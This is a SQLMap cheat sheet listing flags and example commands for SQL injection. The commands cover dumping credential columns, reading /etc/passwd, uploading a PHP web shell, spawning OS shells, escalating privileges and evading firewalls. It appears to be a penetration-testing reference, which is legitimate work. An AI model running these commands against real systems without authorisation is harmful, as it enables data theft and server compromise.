### **Basic Command Structure**
- **Syntax**:
  ```bash
  sqlmap -u "<URL>" [options]
  ```
- **Example**:
  ```bash
  sqlmap -u "http://example.com/login?user=admin"
  ```

### **Setup and Basics**
- `-u "<URL>"`: Specifies the target URL.
  ```bash
  sqlmap -u "http://example.com/page?id=1"
  ```
- `--data="<POST data>"`: Used for POST requests.
  ```bash
  sqlmap -u "http://example.com/login" --data="username=admin&password=1234"
  ```
- `--cookie="<cookie string>"`: Adds cookies to maintain sessions or for authentication.
  ```bash
  sqlmap -u "http://example.com/page" --cookie="PHPSESSID=abcd1234"
  ```
- `--level=[1-5]`: Sets test intensity; higher levels may increase testing depth.
  ```bash
  sqlmap -u "http://example.com/page?id=1" --level=5
  ```
- `--risk=[1-3]`: Sets risk level (higher values may run intrusive tests).
  ```bash
  sqlmap -u "http://example.com/page?id=1" --risk=3
  ```

### **Detection Flags**
- `--batch`: Runs SQLMap with default responses (no prompts).
  ```bash
  sqlmap -u "http://example.com/page?id=1" --batch
  ```
- `--random-agent`: Randomizes User-Agent to bypass some protections.
  ```bash
  sqlmap -u "http://example.com/page?id=1" --random-agent
  ```
- `--tor`: Routes SQLMap requests through the TOR network.
  ```bash
  sqlmap -u "http://example.com/page?id=1" --tor
  ```
- `--wizard`: Starts interactive wizard mode to guide configuration.
  ```bash
  sqlmap --wizard
  ```

### **Testing Injection Points**
- `--technique=<techniques>`: Limits SQLMap to specific injection techniques (B, E, U, S, T).
  - **Example**:
    ```bash
    sqlmap -u "http://example.com/page?id=1" --technique=BEUS
    ```
  - `B`: Boolean-based
  - `E`: Error-based
  - `U`: UNION-based
  - `S`: Stacked queries
  - `T`: Time-based

### **Database Enumeration**
- `--dbs`: Lists all databases in the target.
  ```bash
  sqlmap -u "http://example.com/page?id=1" --dbs
  ```
- `-D <database_name> --tables`: Lists all tables in a specified database.
  ```bash
  sqlmap -u "http://example.com/page?id=1" -D users --tables
  ```
- `-D <database_name> -T <table_name> --columns`: Lists all columns in a specified table.
  ```bash
  sqlmap -u "http://example.com/page?id=1" -D users -T accounts --columns
  ```

### **Extracting Data**
- `--dump`: Dumps data from all tables in a database.
  ```bash
  sqlmap -u "http://example.com/page?id=1" --dump
  ```
- `-D <database_name> -T <table_name> --dump`: Dumps data from a specific table.
  ```bash
  sqlmap -u "http://example.com/page?id=1" -D users -T accounts --dump
  ```
- `--dump-all`: Dumps data from all databases.
  ```bash
  sqlmap -u "http://example.com/page?id=1" --dump-all
  ```

### **Specific Data Extraction**
- `-C "<columns>"`: Specifies columns to extract from a table.
  ```bash
  sqlmap -u "http://example.com/page?id=1" -D users -T accounts -C "username,password" --dump
  ```

### **Authentication and Session Management**
- `--auth-type=<type>` and `--auth-cred="<username>:<password>"`: For basic, digest, NTLM, or certificate-based authentication.
  ```bash
  sqlmap -u "http://example.com/page" --auth-type=basic --auth-cred="admin:password"
  ```
- `--proxy=<proxy>`: Uses a proxy server.
  ```bash
  sqlmap -u "http://example.com/page?id=1" --proxy="http://localhost:8080"
  ```
- `--proxy-cred="<username>:<password>"`: Adds authentication for proxies.
  ```bash
  sqlmap -u "http://example.com/page?id=1" --proxy="http://localhost:8080" --proxy-cred="user:pass"
  ```
- `--headers="<headers>"`: Adds custom headers.
  ```bash
  sqlmap -u "http://example.com/page?id=1" --headers="User-Agent: custom-agent"
  ```

### **HTTP Request Methods and Headers**
- `-r <request_file>`: Loads a saved HTTP request file.
  ```bash
  sqlmap -r request.txt
  ```
- `--method=<method>`: Sets HTTP method (e.g., `PUT`, `DELETE`).
  ```bash
  sqlmap -u "http://example.com/page" --method=PUT
  ```
- `--user-agent="<user_agent>"`: Sets a custom User-Agent string.
  ```bash
  sqlmap -u "http://example.com/page?id=1" --user-agent="MyCustomAgent"
  ```
- `--referer="<referer>"`: Adds a referer header.
  ```bash
  sqlmap -u "http://example.com/page?id=1" --referer="http://google.com"
  ```

### **Advanced Techniques and Options**
- `--os-shell`: Attempts to spawn an OS shell.
  ```bash
  sqlmap -u "http://example.com/page?id=1" --os-shell
  ```
- `--sql-shell`: Opens a SQL shell to run custom SQL commands.
  ```bash
  sqlmap -u "http://example.com/page?id=1" --sql-shell
  ```
- `--file-read=<file_path>`: Attempts to read server files.
  ```bash
  sqlmap -u "http://example.com/page?id=1" --file-read="/etc/passwd"
  ```
- `--file-write=<local_file>` and `--file-dest=<remote_path>`: Uploads files.
  ```bash
  sqlmap -u "http://example.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
  ```

### **Bypassing WAFs and Firewalls**
- `--tamper=<script>`: Uses tamper scripts to modify payloads.
  - Example tamper scripts: `between.py`, `space2comment.py`
  ```bash
  sqlmap -u "http://example.com/page?id=1" --tamper=space2comment.py
  ```
- `--delay=<seconds>`: Adds delay between requests to avoid detection.
  ```bash
  sqlmap -u "http://example.com/page?id=1" --delay=2
  ```
- `--safe-url=<URL>` and `--safe-freq=<freq>`: Re-checks a safe URL between attacks.
  ```bash
  sqlmap -u "http://example.com/page?id=1" --safe-url="http://example.com/home" --safe-freq=10
  ```

### **Performance Optimization**
- `--threads=<num>`: Sets the number of concurrent threads.
  ```bash
  sqlmap -u "http://example.com/page?id=1" --threads=5
  ```
- `--time-sec=<seconds>`: Sets time delay for time-based injections.
  ```bash
  sqlmap -u "http://example.com/page?id=1" --time-sec=5
  ```

### **Post-Exploitation**
- `--os-pwn`: Attempts privilege escalation on the OS.
  ```bash
  sqlmap -u "http://example.com/page?id=1" --os-pwn
  ```
- `--priv-esc`: Checks for privilege escalation vulnerabilities.
  ```bash
  sqlmap -u "http://example.com/page?id=1" --priv-esc
  ```
- `--sqlmap-shell`: Opens an interactive SQL shell for advanced database commands.
  ```bash
  sqlmap --sqlmap-shell
  ```

Each of these commands allows for deep and customizable SQL injection testing, helping to identify and exploit vulnerabilities with **SQLMap** responsibly and within legal limits.
